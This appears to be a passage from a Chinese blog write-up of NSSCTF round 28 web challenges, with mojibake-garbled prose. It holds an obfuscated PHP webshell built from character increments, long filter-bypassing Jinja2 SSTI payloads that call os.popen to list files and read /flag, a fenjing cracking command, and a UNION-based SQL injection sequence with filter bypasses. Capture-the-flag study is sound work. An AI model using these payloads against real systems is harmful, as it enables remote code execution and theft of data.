$_=[].\u0026#39;\u0026#39;;$_=$_[\u0026#39;\u0026#39;==\u0026#39;$\u0026#39;];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_=\u0026#39;_\u0026#39;.$_;$$_[_]($$_[__]); ç„¶åæ˜¯\n1 %24_%3D%5B%5D.\u0026#39;\u0026#39;%3B%24_%3D%24_%5B\u0026#39;\u0026#39;%3D%3D\u0026#39;%24\u0026#39;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D\u0026#39;_\u0026#39;.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B ä½†æ˜¯è¿™ä¸ªpaylaodä¸è¡Œï¼Œå› ä¸ºé™åˆ¶äº†å­—ç¬¦ï¼Œè¿˜æ˜¯è¦åˆ©ç”¨æ•°å­—ï¼Œæ‰€ä»¥åº”è¯¥æ‰“$_GET[1] ($_GET[2])\n1 2 3 4 5 6 7 8 9 $_=[]._;//Array $__=$_[1];//r $_=$_[0];//A $_++;//B $_1=++$_;//$_1=C,$_=D(è¿™é‡Œæ˜¯å‰ç¼€++ï¼Œå³å…ˆè‡ªå¢ä¸€å†èµ‹å€¼) $_++;$_++;$_++;$_++;//$_=H $_=$_1.++$_.$__;//CHr $_=_.$_(71).$_(69).$_(84);//_GET $$_[1]($$_[2]); //$_GET[1]$_GET[2] 1 %24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B%20 è¿™é‡Œæ˜¯118ä¸ªå­—ç¬¦ï¼Œæ¯”è¾ƒæé™ï¼Œä¸‹é¢æ›´å¥½ï¼Œåªæœ‰111å­—ç¬¦\n1 2 3 4 5 6 7 8 9 10 11 12 $_=([]._){0}; //A $_++; $_1=++$_; //$_1=C $_++; $_++; $_++; $_++; $_1.=++$_.([]._){1}; //$_1=CHr $_=_.$_1(71).$_1(69).$_1(84); //$_=_GET $$_[1]($$_[2]); //$_GET[1]($_GET[2]) //ç¼©çŸ­ä¸ºä¸€è¡Œ $_=([]._){0};$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_1.=++$_.([]._){1};$_=_.$_1(71).$_1(69).$_1(84);$$_[1]($$_[2]); [ä»CTFShowRCEæŒ‘æˆ˜]ä¸­å­¦ä¹ è‡ªå¢æ„é€ webshell-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘\nå¯¹äºRCEå’Œæ–‡ä»¶åŒ…å«çš„ä¸€ç‚¹æ€»ç»“ | root@wanth3f1ag\n[HNCTF] challenge_rce - Boogiepop Doesn\u0026rsquo;t Laugh\nCoding Loving-ssti æœ‰æºç å…ˆå®¡è®¡ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from flask import Flask, request, render_template, session, url_for app = Flask(__name__) app.secret_key = \u0026#39;Cialloï½(âˆ ãƒ»Ï‰ ï¼œï¼‰âŒ’â˜…\u0026#39; # è®¾ç½®åº”ç”¨å¯†é’¥ï¼Œç”¨äºä¼šè¯åŠ å¯† # å®šä¹‰è¿‡æ»¤å…³é”®è¯åˆ—è¡¨ FILTER_KEYWORDS = [\u0026#39;Cialloï½(âˆ ãƒ»Ï‰ ï¼œï¼‰âŒ’â˜…\u0026#39;] TIME_LIMIT = 1 # æ—¶é—´é™åˆ¶ï¼Œæœªåœ¨ä»£ç ä¸­ä½¿ç”¨ # å®šä¹‰å‡½æ•°ï¼Œæ£€æŸ¥è¾“å…¥ä¸­æ˜¯å¦åŒ…å«ç¦æ­¢çš„å…³é”®è¯ def contains_forbidden_keywords(complaint): for keyword in FILTER_KEYWORDS: if keyword.lower() in complaint: # æ£€æŸ¥å…³é”®è¯æ˜¯å¦åœ¨è¾“å…¥ä¸­ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ return True return False @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) # å®šä¹‰è·¯ç”± \u0026#39;/\u0026#39;ï¼Œæ”¯æŒ GET å’Œ POST æ–¹æ³• def index(): session[\u0026#39;user\u0026#39;] = \u0026#39;test\u0026#39; # è®¾ç½®ä¼šè¯ä¸­çš„ç”¨æˆ·ä¸º \u0026#39;test\u0026#39; command = request.form.get(\u0026#39;cmd\u0026#39;, \u0026#39;coding\u0026#39;) # è·å–è¡¨å•ä¸­çš„ \u0026#39;cmd\u0026#39; å€¼ï¼Œé»˜è®¤ä¸º \u0026#39;coding\u0026#39; return render_template(\u0026#39;index.html\u0026#39;, command=command) # æ¸²æŸ“ index.html æ¨¡æ¿ï¼Œä¼ é€’ command å‚æ•° @app.route(\u0026#39;/test\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) # å®šä¹‰è·¯ç”± \u0026#39;/test\u0026#39;ï¼Œæ”¯æŒ GET å’Œ POST æ–¹æ³• def shell(): if session.get(\u0026#39;user\u0026#39;) != \u0026#39;test\u0026#39;: # æ£€æŸ¥ä¼šè¯ä¸­çš„ç”¨æˆ·æ˜¯å¦ä¸º \u0026#39;test\u0026#39; return render_template(\u0026#39;Auth.html\u0026#39;) # å¦‚æœä¸æ˜¯ï¼Œæ¸²æŸ“ Auth.html æ¨¡æ¿ï¼ˆå¯èƒ½æ˜¯ç™»å½•é¡µé¢ï¼‰ if (abc := request.headers.get(\u0026#39;User-Agent\u0026#39;)) is None: # è·å– User-Agent å¤´ï¼Œå¦‚æœä¸å­˜åœ¨ return render_template(\u0026#39;Auth.html\u0026#39;) # è¿”å› Auth.html æ¨¡æ¿ cmd = request.args.get(\u0026#39;cmd\u0026#39;, \u0026#39;è¯•ä¸€è¯•\u0026#39;) # è·å– URL å‚æ•°ä¸­çš„ \u0026#39;cmd\u0026#39; å€¼ï¼Œé»˜è®¤ä¸º \u0026#39;è¯•ä¸€è¯•\u0026#39; if request.method == \u0026#39;POST\u0026#39;: # å¦‚æœæ˜¯ POST è¯·æ±‚ css_url = url_for(\u0026#39;static\u0026#39;, filename=\u0026#39;style.css\u0026#39;) # ç”Ÿæˆé™æ€æ–‡ä»¶ style.css çš„ URL command = request.form.get(\u0026#39;cmd\u0026#39;) # è·å–è¡¨å•ä¸­çš„ \u0026#39;cmd\u0026#39; å€¼ if contains_forbidden_keywords(command): # æ£€æŸ¥å‘½ä»¤ä¸­æ˜¯å¦åŒ…å«ç¦æ­¢çš„å…³é”®è¯ return render_template(\u0026#39;forbidden.html\u0026#39;) # å¦‚æœåŒ…å«ï¼Œæ¸²æŸ“ forbidden.html æ¨¡æ¿ # ä½¿ç”¨ render_template_string æ¸²æŸ“ä¸€ä¸ª HTML å­—ç¬¦ä¸²ï¼Œä¼ é€’ command å’Œ css_url å‚æ•° return render_template_string(f\u0026#39;\u0026#39;\u0026#39; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Loving Music\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{css_url}\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;\u0026lt;url id=\u0026#34;cvh0d9sc75rev485mjl0\u0026#34; type=\u0026#34;url\u0026#34; status=\u0026#34;failed\u0026#34; title=\u0026#34;\u0026#34; wc=\u0026#34;0\u0026#34;\u0026gt;https://fonts.googleapis.com/css2?family=Poppins:wght@400\u0026lt;/url\u0026gt; ;600\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Loving coding\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;emoji\u0026#34;\u0026gt;ğŸ§‘â€ğŸ’»\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;{command}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39;, command=command, css_url=css_url) return render_template(\u0026#39;shell.html\u0026#39;, command=cmd) # å¦‚æœæ˜¯ GET è¯·æ±‚ï¼Œæ¸²æŸ“ shell.html æ¨¡æ¿ï¼Œä¼ é€’ cmd å‚æ•° æ˜¾ç„¶è¿™é‡Œæ¼æ´ç‚¹åœ¨render_template_string ï¼Œè¿™ä¸ªä¸sstiå¯†ä¸å¯åˆ†ï¼ˆrender_template_stringå‡½æ•°åœ¨æ¸²æŸ“æ¨¡æ¿çš„æ—¶å€™ä½¿ç”¨äº†%sæ¥åŠ¨æ€çš„æ›¿æ¢å­—ç¬¦ä¸²ï¼Œåœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ {undefined{**}} åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚ï¼‰\nFlaskçš„æ¸²æŸ“æ–¹æ³•å‡½æ•°\u0026mdash;render_template()/render_template_string()-CSDNåšå®¢\næ‰€ä»¥å°±æ˜¯æ‰“ssti(åœ¨/testè·¯ç”±ï¼Œcmdæ˜¯å‚æ•°)ï¼Œå…ˆfuzzä¸€ä¸‹ï¼Œè¿™äº›éƒ½æ˜¯æ²¡è¿‡æ»¤çš„\nä¸‹é¢æ˜¯è¿‡æ»¤çš„ï¼ˆä¸‹é¢è¿˜ä¸€äº›å…³é”®è¯ï¼Œé‚£äº›æ— æ‰€è°“ï¼Œç›´æ¥å¼•å·ç»•è¿‡äº†ï¼‰ï¼Œæ˜¾ç„¶ï¼Œå›°éš¾çš„æ˜¯æ•°å­—ï¼Œä¸‹åˆ’çº¿è¿‡æ»¤äº†ï¼Œå› ä¸ºä¸‹åˆ’çº¿è¿‡æ»¤äº†ï¼Œä¸€èˆ¬ç”¨requeståŠ attrï¼Œæˆ–è€…ç¼–ç ï¼Œä½†æ˜¯æ•°å­—å’Œç‚¹è¿‡æ»¤äº†ï¼Œè¿™è®©æˆ‘æŸæ‰‹æ— ç­–ã€‚\né‚£å°±ç›´æ¥fenjingè·‘ï¼\nä¸€å¼€å§‹æˆ‘ç›´æ¥è·‘fenjingè·‘ä¸å‡ºï¼Œä¸€èˆ¬é»˜è®¤è·‘fenjingåŸºæœ¬è·‘ä¸å‡ºï¼Œè¦æ ¹æ®é¢˜ç›®åŠ ç‚¹å‚æ•°æ‰è¡Œã€‚è¿™ä¸ªfenjingè·‘è¦å¸¦è·¯ç”±ï¼Œcookieï¼Œä¸ç„¶è·‘ä¸å‡ºã€‚è¿™é‡Œæˆ‘çŒœçŒœåŸå› ï¼Œè¿™é‡Œè®¾ç½®äº†seesionä¼šè¯ç”¨æˆ·æ˜¯testï¼Œåé¢è¿˜è¿›è¡Œäº†éªŒè¯ï¼Œæ‰€ä»¥è¦å¸¦ä¸Šseesionæ‰è¡Œã€‚\nfenjingå¦‚æœä½ æ˜¯pipä¸‹è½½å°±æ‰“\n1 fenjing crack --url http://node6.anna.nssctf.cn:23137/test --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-ICRg.6h9VWlD5DS5HIzdu7uCxabtUeVQ --inputs cmd --method POST ä¸ç„¶å°±å‘½ä»¤è¡Œå‰åŠ pyhton -må°±è¡Œ\n1 python -m fenjing crack --url http://node6.anna.nssctf.cn:23137/test --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-ICRg.6h9VWlD5DS5HIzdu7uCxabtUeVQ --inputs cmd --method POST ç„¶åæ‰§è¡Œå‘½ä»¤å°±è¡Œ\nè¿™é‡Œç»™å‡ºpayloadï¼šls\n1 cmd={{((cycler[\u0026#39;next\u0026#39;][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;GLOBALS\u0026#39;|lower+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;builtins\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;import\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count](\u0026#39;os\u0026#39;))[\u0026#39;popen\u0026#39;](((lipsum()|urlencode|first+\u0026#39;c\u0026#39;)*(x,x,x,x)|count)|format(((x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x)|count)*(x,x,x,x,x)|count),((x,x,x,x,x,x,x,x)|count*(x,x,x,x)|count),((x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count))))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()}} cat /flag\n1 cmd={{((cycler[\u0026#39;next\u0026#39;][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;GLOBALS\u0026#39;|lower+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;builtins\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;import\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count](\u0026#39;os\u0026#39;))[\u0026#39;popen\u0026#39;](((lipsum()|urlencode|first+\u0026#39;c\u0026#39;)*(x,x,x,x,x,x,x,x,x)|count)|format(((x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x,x,x)|count),(((x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count)*(x,x,x,x)|count),((x,x,x,x,x,x,x,x)|count*(x,x,x,x)|count),((x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count),((x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()}} æ€»ç»“ï¼Œfenjingè¿˜æ˜¯å¾ˆå¼ºï¼Œä»¥å‰ä¸ä¼šç”¨ï¼Œä»¥åæ³¨æ„ä¸€å®šè¦å¸¦ä¸Šå‚æ•°\nlight_pink-sql è¿™é¢˜æ˜¯è€ƒsqlï¼Œä½†æ˜¯æœ‰éé¢„æœŸ\néé¢„æœŸ æ‹¿dirsearchæ‰«ä¸€ä¸‹\n1 python dirsearch.py -u http://node6.anna.nssctf.cn:23588/ db.phpæ²¡æœ‰ä¸œè¥¿ï¼Œä½†æ˜¯shell.phpæœ‰å¥½ä¸œè¥¿\nç›´æ¥æœ‰evaläº†ï¼Œæˆ‘è¿™å¯ä»¥ç›´æ¥æ‰“ä¸€å¥è¯æœ¨é©¬äº†ï¼\nä½†æ˜¯ï¼è¿™é‡Œæœ‰phpinfo!,æ‰€ä»¥æˆ‘çŒœæµ‹ä¸€ä¸‹å¯èƒ½ä¼šæœ‰flagï¼Œç›´æ¥æœflagæˆ–è€…nssï¼Œå‘ç°flagåœ¨ç¯å¢ƒå˜é‡\né¢„æœŸè§£ é¢„æœŸè§£æ˜¾ç„¶å°±æ˜¯æ‰“sql\nå…ˆæ‰“1'#%23(%23å°±æ˜¯#ï¼Œ\u0026ndash;+è¢«è¿‡æ»¤äº†)\nç„¶åè¯•1' order by 5%23(è¯•åˆ°6æŠ¥é”™)\nç„¶åçœ‹çœ‹å“ªæœ‰å›æ˜¾ï¼Œä½†æ˜¯æŠ¥é”™ï¼ŒåŸå› æ˜¯-è¢«ç¦ç”¨\næœç„¶-è¢«ç¦ï¼Œç»“æœæ˜¯4æ˜¯å›æ˜¾\n1 0\u0026#39; union select 1,2,3,4,5%23 æ¥ä¸‹æ¥æ‰¾è¡¨\n1 0\u0026#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema=database()%23 æ˜¾ç¤ºä¸å¯ä»¥å“¦=ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯**=è¢«è¿‡æ»¤ï¼Œç”¨likeä»£æ›¿**\n1 0\u0026#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema like database()%23 æŸ¥åˆ—\n1 0\u0026#39; union select 1,2,3,group_concat(column_name),5 from information_schema.columns where table_name like \u0026#39;Cute\u0026#39;%23 æŸ¥flag\n1 0\u0026#39; union select 1,2,3,group_concat(Happy),5 from Cute%23 æ­¤é¢˜è¿‡æ»¤äº†-è¿˜æœ‰=,ä½†æ˜¯è¿˜æ˜¯æ¯”è¾ƒå‹å¥½ï¼Œæ¯•ç«ŸæŠ¥é”™è¿˜æ˜¯æœ‰æç¤ºï¼Œæ˜¯ä¸€ä¸ªä¸é”™çš„sqlé¢˜\n","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/nss-round28-web/","title":"nss-round28-web"}]